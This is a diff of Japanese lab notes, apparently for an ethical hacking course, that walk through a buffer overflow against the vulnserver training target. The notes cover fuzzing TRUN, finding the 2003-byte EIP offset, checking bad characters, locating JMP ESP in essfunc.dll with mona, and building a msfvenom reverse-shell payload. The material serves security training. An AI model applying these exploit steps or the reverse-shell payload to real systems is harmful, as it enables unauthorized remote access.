@@ -418,7 +418,7 @@
 - `Ninja Jonin`
 #### Task 7: Perform Buffer Overflow Attack to Gain Access to a Remote System
 - [vulnserver](https://github.com/stephenbradshaw/vulnserver)にバッファオーバーフローを介したRCE  
-  Immunity Debuggerでvulnserver.exeのプロセスをアタッチして監視
+  Immunityデバッガでvulnserver.exeのプロセスをアタッチして監視
 - ```sh
   # vulnserver にアクセス
   nc -nv 10.10.1.11 9999
@@ -427,16 +427,27 @@
   STATS [stat_value]
   TRUN [trun_value]
   ```
-  ```sh
+- ```sh
   # Fuziing、デバッガで監視しているプロセスはRunnningであるため、STATSコマンドは脆弱ではなさそう
   echo 's_readline();\ns_string("STATS ");\ns_string_variable("0");' > stats.spk
   generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
   
-  # Fuziing、デバッガで監視しているプロセスはPausedであるため、TRUNコマンドにバッファオーバフローの脆弱性がありそう
+  # Fuziing、途中でTCP接続が失敗する
+  # デバッガで監視しているプロセスはPausedであり、EAX、ESP、EBP、EIPのスタックレジストが41(ASCII値のA)に上書きされていた、RUUNコマンドにバッファオーバフローの脆弱性がありそう
+  # EIPレジスタを上書きできれば、シェルを取得できる
   echo 's_readline();\ns_string("TRUN ");\ns_string_variable("0");' > stats.spk
   generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
   ```
-  [fuzzywuzzy.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/fuzzywuzzy.py)を使ってTURNコマンドの入力値が何バイトでクラッシュするのが確認すると、11800バイトのデータを受信した後にクラッシュしたことを示すメッセージが表示されるが、デバッガ上ではEIPレジスタは上書きされていなかった（バイトサイズは環境によって変化する）  
-  `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900`で生成した文字列を[WIns_overflow.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIns_overflow.py)でターゲットに送信、デバッガ上でEIPレジスタが「386F4337」に上書きされていた  
-  `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337`で2003バイトのオフセット値であることが分かった
-  badcharはないらしい
+- [fuzzywuzzy.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/fuzzywuzzy.py)を実行してTURNコマンドの入力値が何バイトでクラッシュするのが確認する  
+  デバッガでプロセスがPausedになった直後にfuzzywuzzy.pyを終了、Pythonのメッセージで2400バイトのデータを送信したことを確認できた、デバッガ上ではEIPレジスタは上書きされていなかった  
+- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2410`で生成した文字列を[WIns_overflow.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIns_overflow.py)でターゲットに送信、デバッガ上でEIPレジスタが「386F4337」に上書きされていた  
+  `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2410 -q 386F4337`で2003バイトのオフセット値であることが分かった、どうやら2003バイト以降がオーバーフローしている
+- [sketchcharacters.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/sketchcharacters.py)でbadCharacters(0x01から0xff)があるか確認  
+  コードを`shellcode = "A" * "2003" + B * 4 + badchars`に修正（2003は先ほどのオフセット値、4はEIP分のバイトサイズ）し実行  
+  デバッガでESPを「Follow in Dump」してESP先のメモリを確認、sketchcharacters.pyで送信したbadCharactersはすべてメモリ内に格納されていたのでbadCharactersは無さそう
+- EIP レジスタは、適切なメモリ保護設定のないモジュールがある場合に制御できる  
+  メモリ保護がないモジュールを特定するために、mona.pyを「C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands」内にコピー、デバッガで`!mona modules`を実行  
+  essfunc.dllが「Rebase」「SafeSEH」「ASLR」が無効になっていたので、このモジュール内の「JMP ESP」命令を使用したい
+- `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`で「JMP ESP」のアセンブリが「FFE4」と判明  
+  デバッガで`!mona find -s "\xff\xe4" -m essfunc.dll`実行、「JMP ESP」のアドレスは「0x625011af」と判明
+- `msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00"`でシェルコード作成
